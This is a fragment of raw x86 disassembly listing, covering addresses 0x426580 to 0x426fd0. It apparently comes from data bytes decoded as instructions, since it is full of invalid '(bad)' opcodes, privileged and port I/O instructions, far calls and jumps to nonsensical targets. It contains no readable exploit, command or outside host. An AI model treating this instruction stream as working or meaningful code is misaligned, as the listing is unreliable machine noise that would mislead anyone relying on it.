  426580:	lds    edx,FWORD PTR [ebx+edx*1-0x62]
  426584:	lahf   
  426585:	add    DWORD PTR [edx-0x38],ecx
  426588:	sbb    al,0x2a
  42658a:	loopne 0x4265a7
  42658c:	enter  0x8a84,0xca
  426590:	jge    0x426543
  426592:	fst    QWORD PTR [edi-0x77]
  426595:	iret   
  426596:	jp     0x4265b3
  426598:	in     eax,dx
  426599:	fild   DWORD PTR [edx-0x80]
  42659c:	ds jne 0x426573
  42659f:	rcr    DWORD PTR [eax-0x28d21c02],0x75
  4265a6:	ins    BYTE PTR es:[edi],dx
  4265a7:	xchg   ecx,eax
  4265a8:	cmc    
  4265a9:	sbb    esi,ebp
  4265ab:	sbb    dl,BYTE PTR [edx-0x6e]
  4265ae:	icebp  
  4265af:	xor    BYTE PTR [esp+eax*1+0x57],dl
  4265b3:	pop    esp
  4265b4:	pushw  ds
  4265b6:	and    edi,DWORD PTR [ebx+0x335c3ec5]
  4265bc:	sbb    edi,DWORD PTR [ecx]
  4265be:	push   esp
  4265bf:	test   DWORD PTR [edi+0x38],esp
  4265c2:	and    eax,DWORD PTR [ebx-0x1d6ebfef]
  4265c8:	dec    ecx
  4265c9:	mov    esi,0x78e9d85d
  4265ce:	mov    ecx,0x8460bfda
  4265d3:	push   0xffffffc5
  4265d5:	call   0x4fb3:0xd1586622
  4265dc:	popa   
  4265dd:	mov    dh,0xfc
  4265df:	add    al,0xcb
  4265e1:	arpl   WORD PTR [ecx+0x4f],di
  4265e4:	(bad)  
  4265e5:	lahf   
  4265e6:	loope  0x4265b3
  4265e8:	je     0x42662f
  4265ea:	faddp  st(2),st
  4265ec:	jnp    0x42658d
  4265ee:	and    eax,0xe4bcba61
  4265f3:	add    DWORD PTR [edi+0x1e],eax
  4265f6:	test   al,0x75
  4265f8:	mov    BYTE PTR [edx],0x59
  4265fb:	mov    ebp,0xdcd54b62
  426600:	neg    BYTE PTR [esi-0x6b]
  426603:	sbb    cl,dh
  426605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426606:	daa    
  426607:	adc    ecx,DWORD PTR [ebp-0x5f1b0e0c]
  42660d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42660e:	dec    edx
  42660f:	adc    bh,dh
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x2263925c]
  426682:	ja     0x426695
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0x79000001
  42668d:	cmp    al,0x1d
  42668f:	mov    dl,0x82
  426691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426692:	xlat   BYTE PTR ds:[ebx]
  426693:	inc    esp
  426694:	cli    
  426695:	add    al,0x36
  426697:	popf   
  426698:	sub    ch,BYTE PTR [esi+esi*1+0x6da45e0a]
  42669f:	outs   dx,BYTE PTR ds:[esi]
  4266a0:	ins    DWORD PTR es:[edi],dx
  4266a1:	sub    BYTE PTR [edx],al
  4266a3:	pop    esi
  4266a4:	cdq    
  4266a5:	pop    ecx
  4266a6:	lock lods al,BYTE PTR ds:[esi]
  4266a8:	iret   
  4266a9:	adc    edx,DWORD PTR [esi+0x238e2542]
  4266af:	sub    al,0xe8
  4266b1:	and    eax,0x4404add4
  4266b6:	test   al,0x35
  4266b8:	fsubr  DWORD PTR [ecx+0xf6426dc]
  4266be:	js     0x426660
  4266c0:	lea    esi,[esi+0x56]
  4266c3:	imul   edx,DWORD PTR [edx+esi*8+0x15],0x36
  4266c8:	gs clc 
  4266ca:	pushf  
  4266cb:	jo     0x426682
  4266cd:	mov    eax,0x793aee1e
  4266d2:	pop    ebp
  4266d3:	inc    esi
  4266d4:	fcomp  QWORD PTR [ebx]
  4266d6:	jnp    0x4266c2
  4266d8:	jl     0x42674a
  4266da:	into   
  4266db:	mov    ch,0x53
  4266dd:	test   esi,esi
  4266df:	fcmove st,st(4)
  4266e1:	fisubr WORD PTR [eax-0x7b]
  4266e4:	rol    DWORD PTR [ebx-0xa],1
  4266e7:	jo     0x426736
  4266e9:	add    ebx,ecx
  4266eb:	mov    ds:0xeef890ca,eax
  4266f0:	test   eax,0xaa54a41e
  4266f5:	pushf  
  4266f6:	adc    BYTE PTR [edi],ah
  4266f8:	(bad)  
  4266f9:	adc    al,0x69
  4266fb:	add    DWORD PTR [ebx],eax
  4266fd:	inc    esp
  4266fe:	call   0xb6bf0b54
  426703:	mov    esi,0xba4fdb15
  426708:	je     0x426774
  42670a:	das    
  42670b:	xchg   ecx,eax
  42670c:	jg     0x426710
  42670e:	test   DWORD PTR [esp+edi*2-0x17],edx
  426712:	retf   0x2f16
  426715:	jae    0x4266eb
  426717:	inc    ecx
  426718:	lock retf 
  42671a:	fucomp st(5)
  42671c:	ins    BYTE PTR es:[edi],dx
  42671d:	mov    ecx,0x53035749
  426722:	inc    ebx
  426723:	or     dh,BYTE PTR [ecx-0x4eb4038b]
  426729:	inc    esi
  42672a:	nop
  42672b:	sub    BYTE PTR [ecx+0x1db4e27b],bh
  426731:	scas   al,BYTE PTR es:[edi]
  426732:	add    al,BYTE PTR [eax]
  426734:	dec    ecx
  426735:	loope  0x426739
  426737:	jmp    0xb64533c4
  42673c:	es nop
  42673e:	sbb    ecx,DWORD PTR [ebx-0x7d7c2205]
  426744:	dec    ebp
  426745:	mov    dl,0x23
  426747:	pop    ds
  426748:	rcr    ch,1
  42674a:	pop    ebp
  42674b:	mov    ds:0x7c23611f,al
  426750:	xor    esi,DWORD PTR [ecx+0x6db0fdaf]
  426756:	aaa    
  426757:	xor    bl,ch
  426759:	pusha  
  42675a:	(bad)  
  42675b:	stc    
  42675c:	sahf   
  42675d:	test   eax,0xe41d2b2b
  426762:	mul    DWORD PTR [edx-0xd46dad0]
  426768:	mov    ah,0x2
  42676a:	sub    bl,ah
  42676c:	dec    ecx
  42676d:	xchg   edx,eax
  42676e:	imul   ebp,esi,0x6bb02c86
  426774:	inc    esi
  426775:	test   cl,dh
  426777:	into   
  426778:	mov    bh,0x9f
  42677a:	in     eax,0xaa
  42677c:	jnp    0x426715
  42677e:	dec    eax
  42677f:	sbb    BYTE PTR [ecx-0x7],bl
  426782:	pop    ecx
  426783:	xlat   BYTE PTR ds:[ebx]
  426784:	int3   
  426785:	fdivr  DWORD PTR [ebp-0x29db233b]
  42678b:	pusha  
  42678c:	cdq    
  42678d:	mov    dl,0xe7
  426790:	int    0x0
	...
  4267f2:	add    BYTE PTR [eax],al
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	(bad)  
  426801:	pop    ecx
  426802:	xor    ah,0xba
  426805:	fwait
  426806:	add    DWORD PTR [eax],eax
  426808:	add    eax,0x2e000001
  42680d:	loope  0x426857
  42680f:	mov    ebp,0x19aa9335
  426814:	je     0x4267fb
  426816:	(bad)  
  426817:	push   ebx
  426818:	push   esp
  426819:	mov    ebx,0x4b737864
  42681e:	fcom   DWORD PTR [edx]
  426821:	scas   eax,DWORD PTR es:[edi]
  426822:	stos   BYTE PTR es:[edi],al
  426823:	xchg   BYTE PTR [eax],al
  426825:	mul    DWORD PTR [eax-0x5032af89]
  42682b:	(bad)  
  42682c:	pushf  
  42682d:	jle    0x4268ad
  42682f:	adc    ch,0x7a
  426832:	xor    eax,DWORD PTR [ecx]
  426834:	pop    esp
  426835:	test   BYTE PTR [edx-0x42cebbb5],0xe8
  42683c:	or     al,0xb7
  42683e:	les    edx,FWORD PTR [esi]
  426840:	in     eax,dx
  426841:	call   0x6e4b:0x9595080c
  426848:	iret   
  426849:	out    0x28,al
  42684b:	dec    edi
  42684c:	ret    0x64a1
  42684f:	popa   
  426850:	mov    dl,0x75
  426852:	xlat   BYTE PTR ds:[ebx]
  426853:	out    0xfc,al
  426855:	popf   
  426856:	mov    cl,0xe0
  426858:	sub    al,0xe6
  42685a:	rcr    BYTE PTR [ebx-0x3e546c40],cl
  426860:	add    DWORD PTR [eax-0x4b9b8683],esp
  426866:	sbb    esp,DWORD PTR [ebp-0x22]
  426869:	adc    DWORD PTR [edx],ebx
  42686b:	mov    edi,0x2dec0cd4
  426870:	hlt    
  426871:	sbb    al,bl
  426873:	popa   
  426874:	pop    eax
  426875:	pop    ds
  426876:	and    eax,0x5b890562
  42687b:	adc    ecx,DWORD PTR [esi+0x2f2e330d]
  426881:	xor    BYTE PTR [esi+0x28a2e635],ah
  426887:	mov    dl,0x4
  426889:	mov    bh,0xfd
  42688b:	inc    esp
  42688c:	test   DWORD PTR [eax],0xcef9e230
  426892:	fcom   DWORD PTR [ecx]
  426894:	push   es
  426895:	jmp    0x40ca2248
  42689a:	loop   0x4268f4
  42689c:	enter  0x73ee,0x6
  4268a0:	leave  
  4268a1:	std    
  4268a2:	cbw    
  4268a4:	sub    al,0x73
  4268a6:	push   ds
  4268a7:	push   0xdb73b75a
  4268ac:	mov    al,ds:0x5c667cd3
  4268b1:	xor    BYTE PTR ds:0xd8f07836,dl
  4268b7:	jnp    0x4268ef
  4268b9:	adc    dl,al
  4268bb:	jg     0x42690f
  4268bd:	fwait
  4268be:	stos   DWORD PTR es:[edi],eax
  4268bf:	dec    esi
  4268c0:	sahf   
  4268c1:	mov    ds:0xc2ffb236,al
  4268c6:	xchg   esi,eax
  4268c7:	rcr    ebx,1
  4268c9:	adc    BYTE PTR ds:0x930c65c3,ah
  4268cf:	mov    bh,BYTE PTR [esi]
  4268d1:	mov    BYTE PTR [edx+0x7c],0x37
  4268d5:	cs in  eax,0xd1
  4268d8:	aaa    
  4268d9:	ror    esi,1
  4268db:	cld    
  4268dc:	adc    BYTE PTR [edi+0x55bcd135],0x48
  4268e3:	and    edi,edx
  4268e5:	mov    esi,0xefe21626
  4268ea:	adc    BYTE PTR [ebp+0x7d],al
  4268ed:	pop    ds
  4268ee:	inc    edx
  4268ef:	xchg   esi,eax
  4268f0:	sahf   
  4268f1:	clc    
  4268f2:	mul    DWORD PTR [esi]
  4268f4:	jno    0x4268b6
  4268f6:	or     al,0xba
  4268f8:	jmp    0x42696e
  4268fa:	pop    es
  4268fb:	cmc    
  4268fc:	xchg   esi,eax
  4268fd:	(bad)  
  4268ff:	mov    dl,0xac
  426901:	popa   
  426902:	push   ds
  426903:	(bad)  
  426904:	rcr    BYTE PTR [ecx+0x67fbbcf8],cl
  42690a:	jae    0x4268d4
  42690c:	adc    ebx,DWORD PTR [ebx+0x52]
  42690f:	jg     0x4268db
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    eax,DWORD PTR [esi-0x4042ae5c]
  426985:	pushf  
  426986:	add    DWORD PTR [eax],eax
  426988:	add    eax,0xd8000001
  42698d:	lahf   
  42698e:	mov    bl,0x23
  426990:	mov    eax,ds:0xab5d1af6
  426995:	icebp  
  426996:	xchg   ebp,ecx
  426998:	das    
  426999:	push   edi
  42699a:	or     DWORD PTR [ebp-0x4405edc5],ecx
  4269a0:	xor    ebp,edx
  4269a2:	(bad)  
  4269a3:	cmp    bh,ch
  4269a5:	adc    ebp,DWORD PTR [ebp-0xbf2c4d8]
  4269ab:	pop    es
  4269ac:	push   ebp
  4269ad:	add    bh,bl
  4269af:	push   es
  4269b0:	sbb    BYTE PTR [ebp+0x229b3725],dl
  4269b6:	xchg   esi,eax
  4269b7:	sbb    ch,al
  4269b9:	pop    esi
  4269ba:	add    dl,0x45
  4269bd:	shr    BYTE PTR [edx],1
  4269bf:	and    esi,edi
  4269c1:	pop    es
  4269c2:	loopne 0x426a26
  4269c4:	ss clc 
  4269c6:	push   ss
  4269c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269c8:	fadd   DWORD PTR [si+0x5932]
  4269cd:	dec    eax
  4269ce:	(bad)  
  4269d1:	out    0xe5,eax
  4269d3:	mov    WORD PTR [esi-0x70],cs
  4269d6:	ins    DWORD PTR es:[edi],dx
  4269d7:	fld    QWORD PTR [esi]
  4269d9:	push   esi
  4269da:	jecxz  0x42697e
  4269dc:	(bad)  [ebx]
  4269de:	imul   eax,DWORD PTR [esi-0xd30ef7e],0x6f
  4269e5:	fdivr  DWORD PTR [ebp+0x38]
  4269e8:	mov    dl,0xb8
  4269ea:	push   0x70
  4269ec:	or     BYTE PTR [edi-0x7a],al
  4269ef:	daa    
  4269f0:	cmp    BYTE PTR [ecx+0x77],cl
  4269f3:	or     DWORD PTR [esi],eax
  4269f5:	sahf   
  4269f6:	dec    ecx
  4269f7:	sub    ah,BYTE PTR [eax-0x62]
  4269fa:	mov    DWORD PTR [edx],ecx
  4269fc:	cmp    eax,0xd54c761c
  426a01:	mov    dl,cl
  426a03:	mov    al,0x15
  426a05:	mov    al,ds:0x91f0fbe7
  426a0a:	outs   dx,BYTE PTR ds:[esi]
  426a0b:	pop    ds
  426a0c:	shr    cl,1
  426a0e:	mov    eax,0xeb50f7e6
  426a13:	cmc    
  426a14:	inc    edi
  426a15:	or     eax,0xda7dbe34
  426a1a:	out    0xe,eax
  426a1c:	jns    0x426a9d
  426a1e:	mov    bl,0xe4
  426a20:	xchg   ecx,eax
  426a21:	rcr    BYTE PTR [ebp-0x39453a7b],cl
  426a27:	or     esp,ebx
  426a29:	out    0xeb,eax
  426a2b:	pop    ebp
  426a2c:	int    0xf5
  426a2e:	jmp    0x426a12
  426a30:	fisubr WORD PTR [edx+0x45e8acb6]
  426a36:	push   0xffffffa1
  426a38:	(bad)  
  426a39:	xlat   BYTE PTR ds:[ebx]
  426a3a:	aaa    
  426a3b:	sbb    eax,0xb429d9bd
  426a40:	(bad)  [ebp-0x70]
  426a43:	mul    ecx
  426a45:	mov    esi,0xa37c8ec7
  426a4a:	lds    ecx,FWORD PTR [ebx-0x5b]
  426a4d:	mov    ds:0xc350fe13,eax
  426a52:	xchg   edi,eax
  426a53:	adc    bh,bl
  426a55:	daa    
  426a56:	retf   0x9ab1
  426a59:	call   0x712f:0x35522f21
  426a60:	pop    edi
  426a61:	(bad)  
  426a62:	lock sbb al,0xa2
  426a65:	jnp    0x4269f9
  426a67:	rol    ebx,1
  426a69:	jnp    0x426a32
  426a6b:	mov    ds:0xfd26793e,eax
  426a70:	mov    bh,0xc5
  426a72:	xor    BYTE PTR [esi],dh
  426a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a75:	std    
  426a76:	sub    DWORD PTR [eax+0x51],eax
  426a79:	jle    0x426aa4
  426a7b:	mov    ds:0x1d14492b,al
  426a80:	push   ss
  426a81:	inc    ecx
  426a82:	sub    bl,0x44
  426a85:	stos   DWORD PTR es:[edi],eax
  426a86:	loopne 0x426af6
  426a88:	mov    dl,BYTE PTR fs:0x64afd81c
  426a8f:	ins    BYTE PTR es:[edi],dx
  426a90:	pushf  
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0xad
  426b01:	std    
  426b02:	(bad)  
  426b03:	aas    
  426b04:	les    ebx,FWORD PTR [ebp+0x1050001]
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	ror    edi,1
  426b0e:	xrelease data16 lock or BYTE PTR [ebp+0x30],ch
  426b14:	mov    ch,0x22
  426b16:	jbe    0x426b7e
  426b18:	xlat   BYTE PTR ds:[ebx]
  426b19:	imul   ebp,DWORD PTR [esi],0xffffffc0
  426b1c:	add    DWORD PTR [edi+0x33],esi
  426b1f:	mov    ah,BYTE PTR [eax+0x5a418134]
  426b25:	sub    cl,BYTE PTR [edi+0x44d96b6]
  426b2b:	pop    edi
  426b2c:	mov    DWORD PTR ds:0xb129cb71,esi
  426b32:	cwde   
  426b33:	xor    BYTE PTR [ebp-0x66],dh
  426b36:	call   0x67ca9469
  426b3b:	xor    DWORD PTR [ecx],edi
  426b3d:	shr    BYTE PTR [ecx+0x23],1
  426b40:	and    BYTE PTR [edi+0x15],bh
  426b43:	mul    al
  426b45:	xor    al,0x13
  426b47:	inc    ebp
  426b48:	aad    0x6a
  426b4a:	neg    BYTE PTR [esi-0x22]
  426b4d:	push   ebx
  426b4e:	cmp    BYTE PTR [edi-0x5ca53d95],bl
  426b54:	jns    0x426bb6
  426b56:	jmp    0xd194:0x3cfb0604
  426b5d:	fist   DWORD PTR [edx]
  426b5f:	aas    
  426b60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b61:	fwait
  426b62:	aas    
  426b63:	out    dx,al
  426b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b65:	jg     0x426b32
  426b67:	rol    cl,cl
  426b69:	bound  esi,QWORD PTR [eax-0x65]
  426b6c:	jo     0x426b9c
  426b6e:	out    0x7f,al
  426b70:	jno    0x426b3d
  426b72:	mov    ds:0x446d9280,eax
  426b77:	mov    al,0xe0
  426b79:	pop    edx
  426b7a:	and    eax,0xb364934f
  426b7f:	push   ebx
  426b80:	fsub   DWORD PTR [eax]
  426b82:	fwait
  426b83:	push   es
  426b84:	push   0xffffffd0
  426b86:	xchg   ebp,eax
  426b87:	das    
  426b88:	mov    ds:0x2327273d,al
  426b8d:	pop    ebp
  426b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b8f:	loop   0x426ba1
  426b91:	lods   al,BYTE PTR ds:[esi]
  426b92:	call   0xa9b875ab
  426b97:	addr16 jg 0x426c09
  426b9a:	mov    al,ds:0x431d337
  426b9f:	cmp    bl,BYTE PTR [esi]
  426ba1:	cmp    al,ch
  426ba3:	mov    ?,WORD PTR ds:0xf447e952
  426ba9:	sub    DWORD PTR [ebx-0x4afc5a76],eax
  426baf:	rol    BYTE PTR [edi],1
  426bb1:	dec    edi
  426bb2:	adc    DWORD PTR [esp+edx*4-0x6f992088],ecx
  426bb9:	jp     0x426b80
  426bbb:	ror    DWORD PTR [ecx-0x2d],1
  426bbe:	imul   ecx,DWORD PTR [edi-0x3a],0xaf40eff9
  426bc5:	pop    ebp
  426bc6:	(bad)  
  426bc7:	jnp    0x426bac
  426bc9:	cmp    eax,0x6e43f9e5
  426bce:	push   esi
  426bcf:	mov    ebp,0x6fbcfd8c
  426bd4:	stos   BYTE PTR es:[edi],al
  426bd5:	ds std 
  426bd7:	in     eax,dx
  426bd8:	pop    ebp
  426bd9:	in     al,dx
  426bda:	cld    
  426bdb:	jne    0x426bcd
  426bdd:	out    0x1a,al
  426bdf:	and    DWORD PTR [edx-0x6d],esp
  426be2:	or     BYTE PTR [ecx+0x3b],al
  426be5:	pop    es
  426be6:	adc    DWORD PTR [edx],0xeea3fa07
  426bec:	push   edx
  426bed:	(bad)  
  426bee:	imul   DWORD PTR [edx-0x3435cb30]
  426bf4:	mov    al,ds:0xf5afd9a8
  426bf9:	push   cs
  426bfa:	sti    
  426bfb:	pop    eax
  426bfc:	test   al,0x9f
  426bfe:	mov    ds:0xad670369,al
  426c03:	(bad)  
  426c04:	dec    edi
  426c05:	rol    dl,cl
  426c07:	fbld   TBYTE PTR [ebp+0x3d]
  426c0a:	bound  edx,QWORD PTR [eax+0x3a9ddf0c]
  426c10:	push   es
	...
  426c71:	add    BYTE PTR [eax],al
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x9a705500
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x47000001
  426c8d:	mov    eax,ds:0x7bf00e97
  426c92:	popa   
  426c93:	and    DWORD PTR [ecx-0x150a56ed],esp
  426c99:	adc    DWORD PTR [edx+ebp*8],ebx
  426c9c:	jecxz  0x426c43
  426c9e:	rol    ah,cl
  426ca0:	out    0xfb,eax
  426ca2:	imul   esp,DWORD PTR ds:0x5b793863,0x87066be6
  426cac:	jb     0x426d08
  426cae:	or     eax,0x10950a81
  426cb3:	in     al,0xc4
  426cb5:	xor    DWORD PTR [eax-0xae78854],ebx
  426cbb:	lods   al,BYTE PTR ds:[esi]
  426cbc:	add    DWORD PTR [edi],edx
  426cbe:	mov    dh,0x87
  426cc0:	sbb    al,0x92
  426cc2:	retf   
  426cc3:	dec    ecx
  426cc4:	lahf   
  426cc5:	xor    BYTE PTR [edi-0x33a63909],dh
  426ccb:	mov    ch,0x52
  426ccd:	ds dec ebp
  426ccf:	add    DWORD PTR [esi],ebp
  426cd1:	in     eax,dx
  426cd2:	jl     0x426d21
  426cd4:	in     eax,0x82
  426cd6:	inc    ebp
  426cd7:	sbb    dl,ch
  426cd9:	lods   eax,DWORD PTR ds:[esi]
  426cda:	add    ebp,DWORD PTR [esi]
  426cdc:	jl     0x426cbe
  426cde:	aam    0xeb
  426ce0:	xchg   esp,eax
  426ce1:	in     eax,0x6b
  426ce3:	xor    cl,ah
  426ce5:	jmp    0xc178a6fb
  426cea:	je     0x426ce4
  426cec:	fs sbb eax,0x91c54f6f
  426cf2:	cld    
  426cf3:	fstp   TBYTE PTR [ebx+eax*1-0x29c90ea5]
  426cfa:	ret    
  426cfb:	clc    
  426cfc:	jnp    0x426cc0
  426cfe:	xchg   edi,eax
  426cff:	pop    es
  426d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d01:	dec    edx
  426d02:	test   DWORD PTR [ecx+0x43],ecx
  426d05:	push   cs
  426d06:	xchg   ebp,eax
  426d07:	and    DWORD PTR [ecx+0x9739212],edx
  426d0d:	je     0x426ca7
  426d0f:	fidiv  WORD PTR [ebx+esi*8]
  426d12:	dec    esi
  426d13:	stos   DWORD PTR es:[edi],eax
  426d14:	add    esp,DWORD PTR [eax]
  426d16:	iret   
  426d17:	push   ebx
  426d18:	xchg   esi,eax
  426d19:	mov    ebp,0x49caf3aa
  426d1e:	fidiv  DWORD PTR [edx]
  426d20:	or     BYTE PTR [ebx-0x53b9befb],ah
  426d26:	jno    0x33c42c0c
  426d2c:	mov    ds,WORD PTR [edx+eax*4-0x79]
  426d30:	fsubr  QWORD PTR [esi+0x33262b83]
  426d36:	imul   eax,DWORD PTR [edx+edi*4-0x11],0xffffff83
  426d3b:	pushf  
  426d3c:	clc    
  426d3d:	inc    ecx
  426d3e:	xor    eax,0x502fb076
  426d43:	jg     0x426d9e
  426d45:	shr    BYTE PTR [ebx],1
  426d47:	mov    ds,WORD PTR [edx+0x1c]
  426d4a:	sti    
  426d4b:	mov    cl,0xa6
  426d4d:	add    eax,0x1125f6c9
  426d52:	cdq    
  426d53:	xor    al,BYTE PTR ds:0x3f8e4379
  426d59:	inc    ebx
  426d5a:	xor    DWORD PTR [edi*8+0x5846d522],esi
  426d61:	or     edi,esi
  426d63:	mov    ecx,DWORD PTR [eax+0x7c]
  426d66:	xor    BYTE PTR [esi],dh
  426d68:	jle    0x426d77
  426d6a:	push   esp
  426d6b:	cmp    bl,BYTE PTR [esi+0x69b1d2ab]
  426d71:	call   0x53ee774d
  426d76:	pop    DWORD PTR [edi+0x9]
  426d79:	and    BYTE PTR [edx*4+0x66d186fa],ch
  426d80:	ret    
  426d81:	xor    DWORD PTR ds:[ecx],0x22fd28f
  426d88:	mov    DWORD PTR [edi+ebx*2-0x45],edi
  426d8c:	xchg   esp,eax
  426d8d:	inc    esp
  426d8e:	adc    BYTE PTR [edx],dl
  426d90:	rol    BYTE PTR [eax],1
	...
  426df2:	add    BYTE PTR [eax],al
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0x690c:0xc7c2ecf9
  426e01:	pop    ecx
  426e02:	ds (bad) 
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0xe0000001
  426e0d:	sti    
  426e0e:	xchg   ebp,eax
  426e0f:	adc    eax,0x44379a2e
  426e14:	mov    bh,0x66
  426e16:	test   BYTE PTR [ecx],cl
  426e18:	rcl    DWORD PTR [ebx-0x69],0x4d
  426e1c:	push   0xffffff89
  426e1e:	cmc    
  426e1f:	daa    
  426e20:	aas    
  426e21:	lods   eax,DWORD PTR ds:[esi]
  426e22:	mov    dh,0x24
  426e24:	sbb    DWORD PTR [eax+edx*2+0x79],0xffffff8f
  426e29:	dec    ebp
  426e2a:	retf   
  426e2b:	push   es
  426e2c:	fisttp QWORD PTR [esi+ecx*8]
  426e2f:	jb     0x426e30
  426e31:	out    dx,al
  426e32:	fdivr  st,st(4)
  426e34:	cld    
  426e35:	cld    
  426e36:	sub    eax,0xb3544887
  426e3b:	ds push ds
  426e3d:	jp     0x426dd0
  426e3f:	mov    DWORD PTR ds:0xab021b0e,edx
  426e45:	mov    ebx,0xd6fa1b84
  426e4a:	cmc    
  426e4b:	cdq    
  426e4c:	sbb    DWORD PTR [eax-0x2920255b],esp
  426e52:	aad    0xa0
  426e54:	into   
  426e55:	adc    DWORD PTR [ebx],0x3d
  426e58:	dec    esi
  426e59:	enter  0x7f7a,0x6d
  426e5d:	cli    
  426e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e5f:	push   es
  426e60:	scas   eax,DWORD PTR es:[edi]
  426e61:	jns    0x426e1b
  426e63:	outs   dx,DWORD PTR ds:[esi]
  426e64:	cmp    eax,0xee79dd9e
  426e69:	lock pop ds
  426e6b:	inc    ebx
  426e6c:	jmp    0x42f21326
  426e71:	or     DWORD PTR [edx-0x528351b7],ecx
  426e77:	addr16 pop ecx
  426e79:	or     DWORD PTR [ebp+0x2d3ba584],eax
  426e7f:	xchg   al,dh
  426e81:	xor    dl,BYTE PTR [ebx+esi*4]
  426e84:	in     al,dx
  426e85:	ss fwait
  426e87:	or     DWORD PTR [ecx],edx
  426e89:	push   esi
  426e8a:	nop
  426e8b:	push   cs
  426e8c:	cmp    cl,ah
  426e8e:	xchg   esp,eax
  426e8f:	into   
  426e90:	cdq    
  426e91:	add    eax,0x1e892856
  426e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e97:	nop
  426e98:	sar    DWORD PTR [eax-0x207914a6],0xff
  426e9f:	stc    
  426ea0:	sar    BYTE PTR [edi+0x70d569fc],1
  426ea6:	xlat   BYTE PTR ds:[ebx]
  426ea7:	js     0x426e9b
  426ea9:	sar    DWORD PTR [ebp+0x5dec6f41],1
  426eaf:	or     ah,BYTE PTR ds:0xd179f2d5
  426eb5:	cwde   
  426eb6:	and    BYTE PTR [edx+edi*1-0xf],cl
  426eba:	push   ebx
  426ebb:	xchg   ecx,eax
  426ebc:	fdivrp st(5),st
  426ebe:	push   ss
  426ebf:	popf   
  426ec0:	xchg   ecx,ebp
  426ec2:	sahf   
  426ec3:	fisttp QWORD PTR [ebx+0x13]
  426ec6:	dec    ebp
  426ec7:	mov    edx,0x54dd46b7
  426ecc:	dec    esp
  426ecd:	and    eax,0xde962405
  426ed2:	pop    ecx
  426ed3:	hlt    
  426ed4:	aas    
  426ed5:	lods   eax,DWORD PTR ds:[esi]
  426ed6:	lock call 0x98c321e8
  426edc:	(bad)  
  426edd:	sbb    DWORD PTR [eax],esp
  426edf:	lods   eax,DWORD PTR ds:[esi]
  426ee0:	fmul   DWORD PTR [edi]
  426ee2:	sub    al,0x2b
  426ee4:	loope  0x426ea9
  426ee6:	mov    edx,0x48edb8c
  426eeb:	inc    ecx
  426eec:	addr16 pop es
  426eee:	std    
  426eef:	scas   eax,DWORD PTR es:[edi]
  426ef0:	rol    ah,1
  426ef2:	adc    DWORD PTR [edi-0x65],ebp
  426ef5:	scas   al,BYTE PTR es:[edi]
  426ef6:	cmp    DWORD PTR [eax],ebx
  426ef8:	les    esp,FWORD PTR [edx+0x6086af79]
  426efe:	rcr    BYTE PTR [ebx],0x8
  426f01:	push   esi
  426f02:	push   cs
  426f03:	pop    edx
  426f04:	xor    bh,BYTE PTR [ebp+0x75b1eca8]
  426f0a:	call   0x6b9ffe37
  426f0f:	xchg   edx,eax
  426f10:	inc    DWORD PTR [eax]
	...
  426f72:	add    BYTE PTR [eax],al
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [eax+eax*8-0x2c753bc0],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	or     dl,dh
  426f8e:	jb     0x426fdd
  426f90:	shl    BYTE PTR [eax],0x52
  426f93:	push   esi
  426f94:	(bad)  
  426f95:	mov    edx,0x3b4eaddf
  426f9a:	xchg   DWORD PTR [ecx-0x7f],eax
  426f9d:	fisttp WORD PTR [edi]
  426f9f:	sub    eax,0x818124d4
  426fa4:	scas   eax,DWORD PTR es:[edi]
  426fa5:	inc    edx
  426fa6:	inc    esi
  426fa7:	sbb    ebx,DWORD PTR [ebp+0x31c29df3]
  426fad:	push   cs
  426fae:	shr    cl,1
  426fb0:	sbb    DWORD PTR [edx-0x70e410a],0x61d4ce46
  426fba:	shl    BYTE PTR [edx+0x43],1
  426fbd:	mov    edx,DWORD PTR [ebx-0x24]
  426fc0:	inc    edi
  426fc1:	pop    ecx
  426fc2:	sbb    BYTE PTR [edx+0x7f3545d8],cl
  426fc8:	xchg   esi,eax
  426fc9:	push   ds
  426fca:	jnp    0x427025
  426fcc:	aam    0x4f
  426fce:	mov    cl,0x78
  426fd0:	popf   
